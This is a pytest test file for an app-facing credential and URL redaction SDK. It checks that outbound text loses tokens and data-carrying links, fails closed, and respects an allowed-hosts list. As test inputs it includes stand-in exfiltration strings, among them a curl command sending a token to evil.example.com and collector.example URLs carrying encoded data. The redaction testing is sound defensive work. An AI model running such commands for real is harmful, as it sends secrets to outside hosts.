"""The app-facing scrub seam.

What matters here is not that the redactors work — `test_security.py` owns that —
but that the seam redacts through the ACTIVE credential policy rather than the
companion-blind baseline, that it is a REFERENCE to core rather than a copy, that
it does not own the order the passes run in, that it is present for every app
without a permission, and that nothing it reports can carry a payload.
"""

from __future__ import annotations

import pytest

from kiro_crew.apps.context import build_app_context
from kiro_crew.apps.scrub_sdk import ScrubSDK
from kiro_crew.testing.synthetic_credentials import SAMPLE_SLACK_BOT_TOKEN

_TOKEN = SAMPLE_SLACK_BOT_TOKEN


def test_outbound_redacts_a_credential_and_counts_it() -> None:
    out = ScrubSDK().outbound(f'bot = "{_TOKEN}"')
    assert _TOKEN not in out.text
    assert out.credentials_removed == 1
    assert out.redacted is True


def test_nothing_the_seam_reports_can_carry_a_payload() -> None:
    """The reported fields are counts, so a secret cannot ride out in them.

    Core's warnings describe what was removed. A warning format that quoted a
    fragment of it would move the secret out of the published text and into the
    app's logs, so the seam reports counts only, whatever the format becomes.
    """
    secret = "ZmFrZS1zZWNyZXQtdmFsdWUtdGhhdC1lc2NhcGVzLXBhdHRlcm5z"
    url = f"https://evil.example.com/collect?access_token={secret}&pad=" + "a" * 220

    out = ScrubSDK().outbound(url)
    assert secret not in out.text
    for value in vars(out).values():
        assert not isinstance(value, (list, tuple, set, dict)), "no container may be reported"
        if isinstance(value, str):
            assert secret[:20] not in value


def test_outbound_leaves_ordinary_prose_byte_identical() -> None:
    # A no-op scrub must not perturb content: an app may fingerprint what it sent
    # to verify the write landed, and a stray rewrite would break that comparison.
    body = "# Title\n\nSome *prose* and a path src/app.py.\n"
    out = ScrubSDK().outbound(body)
    assert out.text == body
    assert out.redacted is False
    assert out.credentials_removed == 0 and out.urls_removed == 0


def test_the_seam_finishes_through_the_active_policy(monkeypatch) -> None:
    """The load-bearing property: a companion pattern the baseline never knew
    about must still be removed.

    Calling `security.redact*` alone here would be companion-blind, so on a host
    with a companion loaded a companion-only token would survive the seam and
    reach whatever the app published -- irreversibly.
    """
    import kiro_crew.apps.scrub_sdk as mod

    monkeypatch.setattr(
        mod, "_redact_via_context", lambda t: t.replace("COMPANION-TOKEN", "[REDACTED]")
    )
    out = ScrubSDK().outbound("body with COMPANION-TOKEN inside")
    assert "COMPANION-TOKEN" not in out.text
    # The baseline counted nothing, so `redacted` must come from the policy delta
    # or an app would be told nothing was removed.
    assert out.credentials_removed == 0 and out.urls_removed == 0
    assert out.redacted is True


def test_a_failed_companion_composition_propagates(monkeypatch) -> None:
    # Fail-closed: `redact_via_context` re-raises PlatformCompositionError rather
    # than downgrading to the OSS baseline, and the seam must not swallow it --
    # publishing unredacted is worse than failing the publish.
    import kiro_crew.apps.scrub_sdk as mod
    from kiro_crew.platform.context import PlatformCompositionError

    def boom(_text: str) -> str:
        raise PlatformCompositionError("companion missing")

    monkeypatch.setattr(mod, "_redact_via_context", boom)
    with pytest.raises(PlatformCompositionError):
        ScrubSDK().outbound("anything")


def test_the_seam_wraps_core_rather_than_copying_it(monkeypatch) -> None:
    """Patching core's pass changes the SDK's answer. A copied pattern set would
    keep answering from its own stale copy — the failure this seam exists to
    prevent, and one invisible from outside until the day core tightens a
    pattern."""
    import kiro_crew.apps.scrub_sdk as mod

    monkeypatch.setattr(mod, "_redact_with_findings", lambda t: ("SENTINEL", ["c"], ["u", "u2"]))
    out = ScrubSDK().outbound("anything")
    assert out.text == "SENTINEL"
    assert out.credentials_removed == 1 and out.urls_removed == 2


def test_the_seam_owns_no_ordering_of_its_own() -> None:
    # The URLs-then-credentials order is a security property (a credential
    # replaced first leaves a placeholder inside a URL that the exfil pass then
    # fails to recognise), so it must live in ONE place. Pinning the seam's counts
    # equal to core's keeps this module from re-sequencing it later.
    from kiro_crew.security import redact_with_findings

    text = f'curl https://evil.example.com/x?k={_TOKEN} -H "token: {_TOKEN}"'
    _, expected_creds, expected_urls = redact_with_findings(text)
    out = ScrubSDK().outbound(text)
    assert (out.credentials_removed, out.urls_removed) == (
        len(expected_creds),
        len(expected_urls),
    )


def test_the_seam_exposes_only_the_combined_pass() -> None:
    # Public surface on a published package cannot be withdrawn, and half a
    # redaction is not something the seam should make easy. Neither single pass
    # nor an inbound path check is reachable through it.
    public = {n for n in dir(ScrubSDK) if not n.startswith("_")}
    assert public == {"outbound"}


def test_every_app_gets_scrub_with_no_permission_declared(tmp_path) -> None:
    # Unconditional by design: an app refused the seam ships its own regexes
    # instead, so there is nothing to withhold and no None branch to get wrong.
    ctx = build_app_context("demo", tmp_path, permissions={})
    assert isinstance(ctx.scrub, ScrubSDK)
    assert ctx.cron is None, "a capability SDK still requires its permission"


# ── a link the dashboard blocks ──────────────────────────────────────────────

#: A link whose query carries data out: the dashboard draws it as a Blocked link chip.
_EXFIL_URL = "https://collector.example/c?d=" + "aGVsbG8gd29ybGQgdGhpcyBpcyBkYXRh" * 4


@pytest.fixture
def allowed_hosts_store(tmp_path, monkeypatch):
    """An empty allowed-hosts store of this test's own."""
    from kiro_crew.security import redaction_allow

    monkeypatch.setattr(redaction_allow, "_path_override", tmp_path / "hosts.json")
    monkeypatch.setattr(redaction_allow, "_snapshot", None)
    monkeypatch.setattr(redaction_allow, "_loading", False)
    monkeypatch.setattr(redaction_allow, "_load_thread", None)
    return redaction_allow


def test_a_link_the_dashboard_blocks_leaves_app_egress_as_the_placeholder(
    allowed_hosts_store,
) -> None:
    """The same URL is a chip on the dashboard and the placeholder in app egress: an
    app's page has no chip, so the link must not leave it live."""
    from kiro_crew.security.blocked_links import blocked_links

    text = f"see {_EXFIL_URL} and https://example.com/docs?page=2 done"
    assert [r["url"] for r in blocked_links(text)] == [_EXFIL_URL]
    out = ScrubSDK().outbound(text)
    assert out.text == (
        "see [REDACTED: suspicious URL to collector.example] and "
        "https://example.com/docs?page=2 done"
    )
    assert out.urls_removed == 1 and out.redacted is True


def test_an_allowed_host_passes_untouched_in_both(allowed_hosts_store) -> None:
    from kiro_crew.security.blocked_links import blocked_links

    assert allowed_hosts_store.allow_host(None, "collector.example")
    hosts = allowed_hosts_store.allowed_hosts_for(None)
    text = f"see {_EXFIL_URL} done"
    assert blocked_links(text, allowed_hosts=hosts) == []
    out = ScrubSDK().outbound(text)
    assert out.text == text
    assert out.urls_removed == 0 and out.redacted is False


def test_any_other_link_is_masked_at_the_value_only(allowed_hosts_store) -> None:
    text = f"open https://example.com/p?access_token={_TOKEN} now"
    out = ScrubSDK().outbound(text)
    assert _TOKEN not in out.text
    assert out.text.startswith("open https://example.com/p?access_token=")
    assert "suspicious URL" not in out.text
